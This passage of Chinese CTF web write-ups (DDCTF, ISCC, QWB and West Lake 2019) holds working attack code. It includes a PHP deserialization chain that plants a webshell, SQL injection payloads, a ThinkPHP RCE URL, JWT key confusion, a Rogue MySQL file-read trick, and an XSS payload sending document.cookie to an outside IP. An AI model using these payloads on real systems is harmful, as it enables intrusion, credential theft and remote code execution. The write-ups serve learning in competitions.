= base_url + '/ctf/api/remove_robot?id={0}&amp;ticket={1}'cookies = dict(user_name='zedd',REVEL_SESSION='ef66cfc3f5199180eea686597f4a1e72')for i in range(0,700): user = username + str(i) register_url = register.format(user) req = requests.session() rep = req.get(register_url) rep = req.get(buy_url) rep = req.get(search_url) str_text = r'\"bill_id\":\"(.*)\",' match = re.search(str_text, rep.text, re.M|re.I) if match: bill_id = match.group(1) rep = req.get(pay_url + bill_id) matchObj = re.search( r'{\"your_id\":(.*),\"your_ticket\":\"(.*)\"}]', rep.text, re.M|re.I) # print(rep.text) if matchObj: bot_id = matchObj.group(1) ticket = matchObj.group(2) else: continue r = requests.get(remove_url.format(bot_id,ticket), cookies=cookies) print(r.text) time.sleep(1) 这题还有一种 trick 就是猜榜单已经做出来的师傅的密码，一般 id 都是师傅们的 id ，密码大多都是12345678(别问我怎么知道…我也是12345678… 比如这位师傅，用 12345678 登进去就拿到他的 flag 了。后面就是你敢不敢交的问题了…手动斜眼，毕竟后面有一段看起来貌似是随机的字符串…可能是主办方用来防作弊的？不得而知…hhhh 后面看官方的 wp 发现光房预设解其实是想让选手用 md5 长度拓展攻击去做的，也可以通过下面这题 mysql 弱口令来读吃鸡的源码拿 flag。 另外：登录那里还有个水平越权，无论成功与否，都会返回用户的 cookie ，因此也可以猜师傅们的用户名，直接带着 cookie 去看他的/main/result即可。(2333 Web 7 WEB mysql弱口令Descriptionhttp://117.51.147.155:5000/index.html#/scan部署agent.py再进行扫描哦~ 本题不需要使用扫描器 Hacking很经典的 Rogue-Mysql-Server 一题，但是坑点还是有的。建议使用这个 Github 仓库来做allyshka/Rogue-MySql-Server 题目给了一个 agent.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#!/usr/bin/env python# -*- coding: utf-8 -*-# @Time : 12/1/2019 2:58 PM# @Author : fz# @Site : # @File : agent.py# @Software: PyCharmimport jsonfrom http.server import HTTPServer, BaseHTTPRequestHandlerfrom optparse import OptionParserfrom subprocess import Popen, PIPEclass RequestHandler(BaseHTTPRequestHandler): def do_GET(self): request_path = self.path print(\"\\n----- Request Start -----&gt;\\n\") print(\"request_path :\", request_path) print(\"self.headers :\", self.headers) print(\"&lt;----- Request End -----\\n\") self.send_response(200) self.send_header(\"Set-Cookie\", \"foo=bar\") self.end_headers() result = self._func() self.wfile.write(json.dumps(result)) def do_POST(self): request_path = self.path # print(\"\\n----- Request Start -----&gt;\\n\") print(\"request_path : %s\", request_path) request_headers = self.headers content_length = request_headers.getheaders('content-length') length = int(content_length[0]) if content_length else 0 # print(\"length :\", length) print(\"request_headers : %s\" % request_headers) print(\"content : %s\" % self.rfile.read(length)) # print(\"&lt;----- Request End -----\\n\") self.send_response(200) self.send_header(\"Set-Cookie\", \"foo=bar\") self.end_headers() result = self._func() self.wfile.write(json.dumps(result)) def _func(self): netstat = Popen(['netstat', '-tlnp'], stdout=PIPE) netstat.wait() ps_list = netstat.stdout.readlines() result = [] for item in ps_list[2:]: tmp = item.split() Local_Address = tmp[3] Process_name = tmp[6] tmp_dic = {'local_address': Local_Address, 'Process_name': Process_name} result.append(tmp_dic) return result do_PUT = do_POST do_DELETE = do_GETdef main(): port = 8123 print('Listening on localhost:%s' % port) server = HTTPServer(('0.0.0.0', port), RequestHandler) server.serve_forever()if __name__ == \"__main__\": parser = OptionParser() parser.usage = ( \"Creates an http-server that will echo out any GET or POST parameters, and respond with dummy data\\n\" \"Run:\\n\\n\") (options, args) = parser.parse_args() main() 这里可能会比较容易误导，题目是固定地去请求你的 8123 端口，你必须得在 8123 部署这个 agent.py ，然后看代码，这个 agent.py 并没有做一个内网转发代理什么的，只不过是探测你部署的机器上有没有运行 mysqld 服务以及对应的服务端口是什么，然后他在外网去访问 agent.py 返回的 mysql 的端口。知道这个就非常好做了，基本坑都绕过了…不然的话就像一开始只能一个个排错什么的… 只要把 agent.py 中的返回直接给他改了，改成直接返回自己的端口即可。 12345678910111213def _func(self): netstat = Popen(['netstat', '-tlnp'], stdout=PIPE) netstat.wait() ps_list = netstat.stdout.readlines() result = [] for item in ps_list[2:]: tmp = item.split() Local_Address = tmp[3] Process_name = tmp[6] tmp_dic = {'local_address': '0.0.0.0:3306', 'Process_name': 'mysqld'} result.append(tmp_dic) return result 例如这样，不一定非得 3306 ，可以把 Rogue Mysql 那一套放在其他端口也可。 其他的都是一贯的 Rogue Mysql 的操作，这里就不重复演示了。 然后可以去读/root/.bash_history看之前的路径文件，发现在/home/dc2-user/ctf_web_2/app/main/views.py可以读到题目源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125# coding=utf-8from flask import jsonify, requestfrom struct import unpackfrom socket import inet_atonimport MySQLdbfrom subprocess import Popen, PIPEimport reimport osimport base64# flag in mysql curl@localhost database:security table:flagdef weak_scan(): agent_port = 8123 result = [] target_ip = request.args.get('target_ip') target_port = request.args.get('target_port') if not target_ip or not target_port: return jsonify({\"code\": 404, \"msg\": \"åæ°ä¸è½ä¸ºç©º\", \"data\": []}) if not target_port.isdigit(): return jsonify({\"code\": 404, \"msg\": \"ç«¯å£å¿é¡»ä¸ºæ°å­\", \"data\": []}) if not checkip(target_ip): return jsonify({\"code\": 404, \"msg\": \"å¿é¡»è¾å¥ip\", \"data\": []}) if is_inner_ipaddress(target_ip): return jsonify({\"code\": 404, \"msg\": \"ipä¸è½æ¯åç½ip\", \"data\": []}) tmp_agent_result = get_agent_result(target_ip, agent_port) if not tmp_agent_result[0] == 1:truetem_result = tmp_agent_result[1] result.append(base64.b64encode(tem_result)) return jsonify({\"code\": 404, \"msg\": \"æå¡å¨æªå¼å¯mysql\", \"data\": result}) tmp_result =mysql_scan(target_ip, target_port) if not tmp_result['Flag'] == 1: tem_result = tmp_agent_result[1] result.append(base64.b64encode(tem_result)) return jsonify({\"code\": 0, \"msg\": \"æªæ«æåºå¼±å£ä»¤\", \"data\": []}) else: tem_result = tmp_agent_result[1] result.append(base64.b64encode(tem_result)) result.append(tmp_result) return jsonify({\"code\": 0, \"msg\": \"æå¡å¨å­å¨å¼±å£ä»¤\", \"data\": result})def checkip(ip): p = re.compile('^((25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.){3}(25[0-5]|2[0-4]\\d|[01]?\\d\\d?)$') if p.match(ip): return True else: return Falsedef curl(url): tmp = Popen(['curl', url, '-L', '-o', 'content.log'], stdout=PIPE) tmp.wait() result = tmp.stdout.readlines() return resultdef get_agent_result(ip, port): str_port = str(port) url = 'http://'+ip + ':' + str_port curl(url) if not os.path.exists('content.log'): return (0, 'æªå¼å¯agent') with open('content.log') as f1: tmp_list = f1.readlines() response = ''.join(tmp_list) os.remove('content.log') if not 'mysqld' in response: return (0, response) else: return (1, response)def ip2long(ip_addr): return unpack(\"!L\", inet_aton(ip_addr))[0]def is_inner_ipaddress(ip): ip = ip2long(ip) return ip2long('127.0.0.0') &gt;&gt; 24 == ip &gt;&gt; 24 or \\ ip2long('10.0.0.0') &gt;&gt; 24 == ip &gt;&gt; 24 or \\ ip2long('172.16.0.0') &gt;&gt; 20 == ip &gt;&gt; 20 or \\ ip2long('192.168.0.0') &gt;&gt; 16 == ip &gt;&gt; 16def mysql_scan(ip, port): port = int(port) weak_user = ['root', 'admin', 'mysql'] weak_pass = ['', 'mysql', 'root', 'admin', 'test'] Flag = 0 for user in weak_user: for pass_wd in weak_pass: if mysql_login(ip,port, user, pass_wd): Flag = 1 tmp_dic = {'weak_user': user, 'weak_passwd': pass_wd, 'Flag': Flag} return tmp_dic else: tmp_dic = {'weak_user': '', 'weak_passwd': '', 'Flag': Flag} return tmp_dicdef mysql_login(host, port, username, password): '''mysql login check''' try: conn = MySQLdb.connect( host=host, user=username, passwd=password, port=port, connect_timeout=1, ) print (\"[H:%s P:%s U:%s P:%s]Mysql login Success\" % (host,port,username,password),\"Info\") conn.close() return True except MySQLdb.Error, e: print (\"[H:%s P:%s U:%s P:%s]Mysql Error %d:\" % (host,port,username,password,e.args[0]),\"Error\") return False 可以读/etc/passwd拿到 mysql 的路径，然后根据 mysql 的路径与 flag 在数据库中的位置提示，我们可以直接读/var/lib/mysql/security/flag.ibd中可以拿到 flag，也可以读/var/lib/mysql/ibdata1，只是这个文件一般比较大。 也有师傅说可以读.mysqlhistory .mysql_history虽然读不到数据库内容，但是在这里可以看到这里出题者是用了insert，我们可以看到他的操作的语句，也拿到了 flag 这里可以读到吃鸡那题的代码，路径为/home/dc2-user/ctf_web_1/web_1/main/views.py 12345678910from flask import jsonify, request,redirectfrom app import mongodbfrom app.unitis.tools import get_md5, num64_to_32from app.main.db_tools import get_balance, creat_env_db, search_bill, secrity_key, get_bill_idimport uuidfrom urllib import unquotemydb = mongodb.dbflag = '''DDCTF{chiken_dinner_hyMCX[n47Fx)}''' Web 8 WEB 再来1杯JavaDescription绑定Host访问： 116.85.48.104 c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/ Hacking比赛的时候搞不出来…赛后复现看起来得搞挺多的…还是另开一篇写吧。","link":"/2019/05/06/2019ddctf/"},{"title":"2019 ISCC Web wp","text":"2019 ISCC Web wp，没什么太大意义…原题比较多…没学到啥… WebWeb11234567891011121314151617 &lt;?phperror_reporting(0);require 'flag.php';$value = $_GET['value'];$password = $_GET['password'];$username = '';for ($i = 0; $i &lt; count($value); ++$i) { if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value); else $username .= chr($value[$i]); if ($username == 'w3lc0me_To_ISCC2019' &amp;&amp; intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333) { echo 'Hello '.$username.'!', '&lt;br&gt;', PHP_EOL; echo $flag, '&lt;hr&gt;'; }}highlight_file(__FILE__); 1http://39.100.83.188:8001/?value[]=375&amp;value[]=307&amp;value[]=364&amp;value[]=355&amp;value[]=304&amp;value[]=365&amp;value[]=357&amp;value[]=351&amp;value[]=340&amp;value[]=367&amp;value[]=351&amp;value[]=329&amp;value[]=339&amp;value[]=323&amp;value[]=323&amp;value[]=306&amp;value[]=304&amp;value[]=305&amp;value[]=313&amp;password=2332e1 Web2提示破解3位数字密码，可以写脚本来跑，由于他的验证码是每次 GET 一次就刷一次，验证码处理这块会比较麻烦，学习了一波验证码的处理识别与 selenuim 爬虫的知识，写了个半成品，但是貌似这个处理 response 不太好处理，最后盲猜 996 拿到 flag 12345678910111213141516171819202122232425262728293031323334353637383940import pytesseractimport requestsimport timefrom PIL import Imagefrom selenium import webdriver'''调用接口请求验证码，保存到本地，识别验证，检查识别的验证码对不对。'''driver = webdriver.Chrome()driver.get(\"http://39.100.83.188:8002/\")driver.add_cookie({'domain': '39.100.83.188:8002','name': 'PHPSESSID','value': 'alsrko26h2mlbmkgv54r4gpcf3','path': '/','expires': None})driver.get(\"http://39.100.83.188:8002/\")# 比较好理解、截图并保存到这个路径driver.get_screenshot_as_file('./screenshoot.png')# driver.close()# 打开刚刚保存的图片im = Image.open('./screenshoot.png')# 设置要裁剪的区域（验证码所在的区域）box = (0, 200, 130, 300)# 截图，生成只有验证码的图片region = im.crop(box)# 保存到本地路径region.save(\"./code.png\")# 读取验证码图片image = Image.open(\"./code.png\")# 开始识别验证码optCode = pytesseract.image_to_string(image)# 打印出验证码print(\"验证码：\", optCode)password = '999'driver.find_element_by_name(\"pwd\").send_keys(password)driver.find_element_by_name(\"user_code\").send_keys(optCode)driver.find_element_by_name(\"Login\").click()print(driver) 后来看其他师傅，可以把 cookie 删掉来达到爆破密码 Web3感觉是把 sql-lab 二次注入的题目给拿了上来，就是利用注册admin'#来更改管理员账号密码的那个题 但是貌似过滤了一些字符，但是管他么多，师傅们都是懒的，直接用admin/123456上去拿到 flag 看了其他师傅的wp，可以通过admin'--xx来二次注入，奇怪的是当时我并没有成功…可能并发确实太多了… Web4代码审计题 123456789101112131415161718192021222324 &lt;?phperror_reporting(0);include(\"flag.php\");$hashed_key = 'ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a';$parsed = parse_url($_SERVER['REQUEST_URI']);if(isset($parsed[\"query\"])){ $query = $parsed[\"query\"]; $parsed_query = parse_str($query); if($parsed_query!=NULL){ $action = $parsed_query['action']; } if($action===\"auth\"){ $key = $_GET[\"key\"]; $hashed_input = hash('sha256', $key); if($hashed_input!==$hashed_key){ die(\"&lt;img src='cxk.jpg'&gt;\"); } echo $flag; }}else{ show_source(__FILE__);}?&gt; 又是一个原题，利用pase_str函数的特性： parse_str ( string $encoded_string [, array &amp;$result ] ) : void 如果 encoded_string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）。 传入hashed_key覆盖掉hased_key即可 Payload: 1action=auth&amp;key=test&amp;hashed_key=9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08 Web5http://39.100.83.188:8054/ 脑洞题…脑洞对不上… 参考2019iscc wp，考点是注入，过滤了圆括号，注释符，from等等 payload ：order by 排序盲注 Web6http://39.100.83.188:8053/ 测试发现一些特殊符号被转义 1!@#$%^&amp;amp;*()_+-={}|[]\\\\:\\\";'&amp;lt;&amp;gt;?,./ 然后发现并没有什么用… 然后发现有 jwt ，但是看了一下并没什么，参考了JSON Web Token (JWT) 攻击技巧，试了几种方式，改加密算法为 none 没用，又没有公钥… 然后终于在 http://39.100.83.188:8053/static/js/common.js 中发现了 123456function getpubkey(){ /* get the pubkey for test /pubkey/{md5(username+password)} */} 这个没有用到的函数，还以为公钥是用md5(username+password)，结果发现这是个 url … 访问 http://39.100.83.188:8053/pubkey/9af8bd54cb8f00ac47d6050c99a5494b 得到 1{\"pubkey\":\"-----BEGIN PUBLIC KEY-----\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\\nIC+LX+9V/mpyKe9R3wIDAQAB\\n-----END PUBLIC KEY-----\",\"result\":true} 拿上面那篇先知文章的 exp 出来改一下 12345import jwtpublic = '''-----BEGIN PUBLIC KEY-----\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\\nIC+LX+9V/mpyKe9R3wIDAQAB\\n-----END PUBLIC KEY-----'''print publicprint jwt.encode({\"name\":\"zeddy\",\"priv\":\"admin\"}, key=public, algorithm='HS256') 这里注意，如果要用这个 exp 必须得用pyjwt==0.4.3，而且 python 还有个库也叫 jwt …这里需要用 python2 把两个jwt/PyJWT都卸了，然后装上面那个就行了。 用这个 jwt 访问/list就可以得到 admin 的 pastebin 了，访问即是 flag","link":"/2019/05/30/2019iscc/"},{"title":"2019强网杯部分Web wp","text":"Pwn 网杯再一次用实践行动谁才是 CTF 中爸爸级别的人物！（当然还是 Crypto 爷爷啦 WebUpload随便打开一个页面发现 cookie 存在序列化的样子 1a:5:{s:2:\"ID\";i:2;s:8:\"username\";s:4:\"zedd\";s:5:\"email\";s:11:\"zedd@qq.com\";s:8:\"password\";s:32:\"e10adc3949ba59abbe56e057f20f883e\";s:3:\"img\";N;} 扫目录得到 www.tar.gz 压缩包，代码审计 在Profile.php发现关键代码： 1234567891011public function __get($name){ return $this-&gt;except[$name];}public function __call($name, $arguments){ if($this-&gt;{$name}){ $this-&gt;{$this-&gt;{$name}}($arguments); }} 被出烂的反序列化…这里肯定是利用__call函数去执行我们的命令了。然后在Register.php中看到有关键代码： 123456public function __destruct(){ if(!$this-&gt;registed){ $this-&gt;checker-&gt;index(); }} 很明显了，这里我们用Register-&gt;checker = Profile，利用Profile-&gt;index()去触发Profile类中的__call魔术方法。 但是我们可以看到Profile.php当中的__call方法调用的参数是 123456public function __call($name, $arguments){ if($this-&gt;{$name}){ $this-&gt;{$this-&gt;{$name}}($arguments); }} 通过文档我们可以知道$name是不存在方法的调用的名字，在这里也就是index，$arguments就是传入调用方法的参数，这里就为空。 而当使用$this-&gt;index的时候，我们会触发另一个魔术方法__get ​ 读取不可访问属性的值时，__get() 会被调用。 所以这里我们又因为if判断中调用了$this-&gt;{$name}，而当$this-&gt;{$name}不存在的时候触发了__get，那我们再仔细看看__get方法 1234public function __get($name){ return $this-&gt;except[$name];} 这里又调用了$this-&gt;except[$name]，而$name我们可以通过__call调用的值确定为index，而且Profile类存在一个公有类except可以供我们修改。 接着利用_get的返回会使__call方法中的if为真，执行$this-&gt;{$this-&gt;{$name}}($arguments); 这里我大概简化了一下代码： 结果如下，这样这个构造链就比较清楚了。 既然有了构造链，那我们可以怎么做呢？在Profile类中我们还可以发现上传功能的方法有这样的代码： 123456789101112131415161718if(!empty($_FILES)){ $this-&gt;filename_tmp=$_FILES['upload_file']['tmp_name']; $this-&gt;filename=md5($_FILES['upload_file']['name']).\".png\"; $this-&gt;ext_check();}if($this-&gt;ext) { if(getimagesize($this-&gt;filename_tmp)) { @copy($this-&gt;filename_tmp, $this-&gt;filename); @unlink($this-&gt;filename_tmp); $this-&gt;img=\"../upload/$this-&gt;upload_menu/$this-&gt;filename\"; $this-&gt;update_img(); }else{ $this-&gt;error('Forbidden type!', url('../index')); }}else{ $this-&gt;error('Unknow file type!', url('../index'));} 如果我们不上传文件，就可以直接绕过第一个if判断，直接用赋值绕过第二个if判断，然后可以构造图片马绕过getimagesize的判断，控制$this-&gt;filename为 php webshell 形式，这样利用copy($this-&gt;filename_tmp, $this-&gt;filename)就可以让服务给我复制出了一个 php webshell 了。 好了基本构造攻击链接都基本设计好了。接下来就是怎么触发攻击链了，最开始的源头就是从Register类的__destruct方法开始的，所以我们需要找到一个可以反序列化Register的地方。 在Index.php中我们可以找到 123456789101112public function login_check(){ $profile=cookie('user'); if(!empty($profile)){ $this-&gt;profile=unserialize(base64_decode($profile)); $this-&gt;profile_db=db('user')-&gt;where(\"ID\",intval($this-&gt;profile['ID']))-&gt;find(); if(array_diff($this-&gt;profile_db,$this-&gt;profile)==null){ return 1; }else{ return 0; } }} 可以看到就是通过cookie进行传值进行反序列化操作。所以我们基本上所有的攻击就可以完成了。通过如下代码生成 cookie ，在首页替代 cookie 就行了，即使返回错误，也没关系，只要把文件copy了就行了 12345678910111213141516171819202122232425262728class Index extends Controller{ public $profile; public $profile_db;}class Register extends Controller{ public $checker=true; public $registed;}class Profile extends Controller{ public $checker=false; public $filename_tmp=\"upload/da5703ef349c8b4ca65880a05514ff89/f78492f0513c659e69dab2e47f567202.png\"; public $filename=\"upload/sh.php\"; public $upload_menu; public $ext=1; public $img; public $except=array(\"index\"=&gt;\"upload_img\");}$index =new Index();$reg = new Register();$reg-&gt;checker = new Profile();$index-&gt;profile = $reg;print_r(urlencode(base64_encode(serialize($reg)))); 得到 php websehll 1YToxOntzOjI6IklEIjtPOjI3OiJhcHBcd2ViXGNvbnRyb2xsZXJcUmVnaXN0ZXIiOjg6e3M6NzoiY2hlY2tlciI7TzoyNjoiYXBwXHdlYlxjb250cm9sbGVyXFByb2ZpbGUiOjEzOntzOjc6ImNoZWNrZXIiO2I6MDtzOjEyOiJmaWxlbmFtZV90bXAiO3M6NzY6InVwbG9hZC9kYTU3MDNlZjM0OWM4YjRjYTY1ODgwYTA1NTE0ZmY4OS9mNzg0OTJmMDUxM2M2NTllNjlkYWIyZTQ3ZjU2NzIwMi5wbmciO3M6ODoiZmlsZW5hbWUiO3M6MTM6InVwbG9hZC9zaC5waHAiO3M6MTE6InVwbG9hZF9tZW51IjtOO3M6MzoiZXh0IjtpOjE7czozOiJpbWciO047czo2OiJleGNlcHQiO2E6MTp7czo1OiJpbmRleCI7czoxMDoidXBsb2FkX2ltZyI7fXM6NzoiACoAdmlldyI7TjtzOjEwOiIAKgByZXF1ZXN0IjtOO3M6MTY6IgAqAGZhaWxFeGNlcHRpb24iO2I6MDtzOjE2OiIAKgBiYXRjaFZhbGlkYXRlIjtiOjA7czoxOToiACoAYmVmb3JlQWN0aW9uTGlzdCI7YTowOnt9czoxMzoiACoAbWlkZGxld2FyZSI7YTowOnt9fXM6ODoicmVnaXN0ZWQiO047czo3OiIAKgB2aWV3IjtOO3M6MTA6IgAqAHJlcXVlc3QiO047czoxNjoiACoAZmFpbEV4Y2VwdGlvbiI7YjowO3M6MTY6IgAqAGJhdGNoVmFsaWRhdGUiO2I6MDtzOjE5OiIAKgBiZWZvcmVBY3Rpb25MaXN0IjthOjA6e31zOjEzOiIAKgBtaWRkbGV3YXJlIjthOjA6e319fQ%3D%3D 连上去就可以cat /flag了 高明的黑客拿到题目，有 www.tar.gz 附件，但是解压缩出来有很多 php 文件，打开仔细看都是经过混淆的。一开始没什么思路，然后随便仔细审了一个文件，发现都是假马 存在有 12345echo `$_GET['xxx']`;system($_GET['xxx']);assert($_GET['xxx']);exec($_GET['xxx']);eval($_GET['xxx'] ?? ' '); 但是触发条件都极其恶心，故意不让你触发，有类似 12if('xMpdxjdRB' == 'TgjMxZujP') eval($_GET['xMpdxjdRB'] ?? ' '); 这样或者这样 12$_GET['_5onXTD_C'] = ' ';eval($_GET['_5onXTD_C'] ?? ' '); 反正就是一系列不让你直接拿到 webshell 的操作，感觉应该就是在混淆真的 webshell 了。 既然是混淆真的 webshell ，那我们是不是可以写个脚本制定一些规则遍历一下所有文件呢？例如利用编译原理 LL1 文法，去他么的编译原理，写个🔨的规则，反正要找最终的 webshell ，干脆先直接找所有的 $_GET 或者 $_POST 变量，直接暴力传参探测，看是否有 webshell 执行命令的回显就好了。 不过这好无聊哦…脚本如下… 123456789101112131415161718192021222324252627282930313233343536373839import osimport reimport requestsfilePath = '/Users/zedd/Sites/web2/src'files = os.listdir(filePath)url = \"http://localhost/web2/src/\"def get_rep(filename, name): r_url = url + filename + \"?\" + name + \"=echo `id`;\" rep = requests.get(r_url) print(r_url) if 'uid=501' in rep.content.decode('utf-8'): print(\"Got It! !!!!!!! \" + filename + \" The param is: _GET[\" + name +\"]\")def post_rep(filename, name): r_url = url + filename param = { name: \"echo `id`;\" } rep = requests.post(r_url, data=param) print(r_url + \" POST: \" + name) if 'uid=501' in rep.content.decode('utf-8'): print(\"Got It! !!!!!!! \" + filename + \" The param is: _POST[\" + name +\"]\")for k in files: if k == '.DS_Store': continue if k == 'index.html': continue with open('./src/' + k, 'rt') as f: content = f.read() get = re.findall(r\"GET\\['(.+?)'\\]\", content) post = re.findall(r\"POST\\['(.+?)'\\]\", content) for i in get: get_rep(k, i) for i in post: post_rep(k, i) f.close() 第一天还跑错文件位置了，导致自己跑了好几遍都没出来，开始怀疑自己…第二天清醒了以后，仔细看才发现原来文件位置写错了…然后才跑出来 你看这个文件是得有多可气啊！你看这个黑客是有多可气啊！ 连上去cat /flag就拿到 flag 了 随便注一个注入题… fuzz 了一下，发现回显过滤了 1return preg_match(\"/select|update|delete|drop|insert|where|\\./i\", $inject); 但是讲道理，过滤了select，是无法通过常规操作注入去拿 flag 的，于是考虑是不是不需要拿数据库，就是单纯读文件什么的操作。 可以报错，尝试使用以下读文件，无果 1231' and extractvalue(1, concat(0x7e, (LOAD_FILE('/etc/passwd')),0x7e));1' and (extractvalue(1,concat(0x7e,(isnull('/etc/passwd')),0x7e)))# 这里神奇的事isnull，无论文件存不存在都返回了 0 … 搜索过滤的关键字，在红日代码审计那个找到类似的，用那个的思路尝试 HPP ，无果。 搜到 2018 SUCTF 中也有类似的关键字过滤，发现那道题可以通过类似以下的 payload 堆叠达到注入效果 1set @t=0x73656c65637420312c323b;prepare x from @t;execute x; 但是尝试的时候发现过滤回显 1strstr($inject, \"set\") &amp;&amp; strstr($inject, \"prepare\") 想了好一会，突然发现这是个strstr函数呀！可以用大小写绕过！ 但是题目可能哪里出了问题，好几次拿到 flag 字段内容都为空…我觉得没什么问题…尝试了好几个 payload ，也问了客服，客服说没问题…又随便试了几个终于出了… 123456789select * from supersqli.19198109311145141919810931114514select * from 19198109311145141';Set @t=0x73656c65637420666c61672066726f6d2031393139383130393331313134353134;Prepare x from @t;Execute x;#1';Set @t=0x73656c656374202a2066726f6d2031393139383130393331313134353134;Prepare x from @t;Execute x;#1';Set @t=0x73656c656374202a2066726f6d20737570657273716c692e31393139383130393331313134353134;Prepare x from @t;Execute x;# Bonus还可以有 1RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;# 这种重命名的解法。 整个解法的意思就是把 words 这张表改成 words1 ，把存在 flag 的表 1919810931114514 改成 words，因为默认的 web 是从 words 表中查数据的，这样一改，就不需要我们去select另一张表了。所以接下来就是把 flag 的表的字段改成原来 words 表的字段就可以了。 最后可以通过1 or 1=1#这样的把所有的数据查出来了，这时候的 words 表就是 flag 存在的表了。 强网先锋-上单打开发现可以列目录，在http://117.78.39.172:30280/1/runtime/log/201903/12.log我们可以发现有一段 log 123456789101112---------------------------------------------------------------[ 2019-03-12T23:18:49+08:00 ] 223.104.19.11 GET 39.105.136.196:8000/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1[ error ] [0]variable type error锛� boolean---------------------------------------------------------------[ 2019-03-12T23:18:53+08:00 ] 42.236.10.84 GET 39.105.136.196:8000/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1[ error ] [0]variable type error锛� boolean---------------------------------------------------------------[ 2019-03-12T23:19:52+08:00 ] 223.104.19.11 GET 39.105.136.196:8000/?s=index/\\think\\Request/input&amp;filter=system&amp;data=whoami[ error ] [0]Access to non-public constructor of class think\\Request---------------------------------------------------------------[ 2019-03-12T23:23:59+08:00 ] 223.104.19.11 get /?s=captcha[ error ] [2]system(): Cannot execute a blank command 发现是 tp 的 rce log，直接拿去打http://117.78.39.172:30280/1/public/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag 拿到 flag ConclusionWeb 都比较难，质量都还是不错的。我觉得第一个题 upload 整个构造链还是需要一定技巧的，But 看到一些 wp 直接三言两语就带过了…啧啧…还是学到了一些知识的 再贴一几个我收集到的 wp 吧 babywebbb 智能门锁","link":"/2019/06/04/2019qwb/"},{"title":"2019 西湖论剑 Web wp","text":"2019西湖论剑线上赛 Web wp。除了最后一道原题没时间做，其他都弄出来了。 [TOC] WebWeb 1 猜猜 flag 在哪DescriptionNULL 题目地址：http://ctf1.linkedbyx.com:10122 Hacking扫目录发现有.DS_Store文件，发现http://ctf1.linkedbyx.com:10122/e10adc3949ba59abbe56e057f20f883e目录下有 git 泄露 拿到文件之后有个压缩包，尝试明文攻击得到 hint.txt 拿到 code 为 9faedd5999937171912159d28b219d86，访问flag/seed.txt发现回显 NAVIE 在首页输入 code 参数与 name 参数，回显了另一个 code 综合前面给出的flag/seed.txt，猜测是个随机数的问题，应该是要猜解随机数问题，用php_mt_seed这个工具直接爆破可以得到 seed 访问flag/209228.txt拿到 flag Web2 breakoutDescriptionNULL 题目地址：http://ctf2.linkedbyx.com:10611 Hacking随便用一个用户名进去。 有一个留言功能，可以进行留言，有一个 report 功能，可以报告一个 url 给管理员，还有一个执行命令与清空留言的功能。所以很明显的一个利用思路就是留言处进行 xss ，把留言界面的 url 发送给管理员，拿到 cookie 即可进行命令执行 我们先测试留言 12&lt;script&gt;alert(1);&lt;/script&gt;&lt;:)&gt;alert(1); 发现是字符替代，基本过滤了 DOM 事件，测试用以下 payload 1&lt;/li&gt;&lt;iframe src='http://106.14.153.173:8080/'&gt;&lt;li&gt; 成功收到访问信息，所以需要我们绕过字符替代进行 xss 。按照我博客之前写的 xss 教程，我们可以在 src 处利用 html 实体编码来进行绕过，这样就不会出现关键字了，就像以下 payload : 1&lt;/li&gt;&lt;iframe src=\"&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:window.location='http://106.14.153.173:8080/?'+encodeURI(document.cookie)\"&gt;&lt;/iframe&gt;&lt;li&gt; 然后我们只需要把http://ctf2.linkedbyx.com:10611/main.php在 report 界面提交就好了。 成功拿到 cookie ，这时候我们只需要带着 cookie 去执行命令就好了 1234567891011121314POST /exec.php HTTP/1.1Host: ctf2.linkedbyx.com:10611User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://ctf2.linkedbyx.com:10611/exec.phpContent-Type: application/x-www-form-urlencodedContent-Length: 97Connection: closeCookie: PHPSESSID=hsujvjlaum6vc2c3tg5mraq774; token=KLIMdHTGEnxXSG4mrRRCuQ==; admin=admin_!@@!_admin_admin_hhhhhUpgrade-Insecure-Requests: 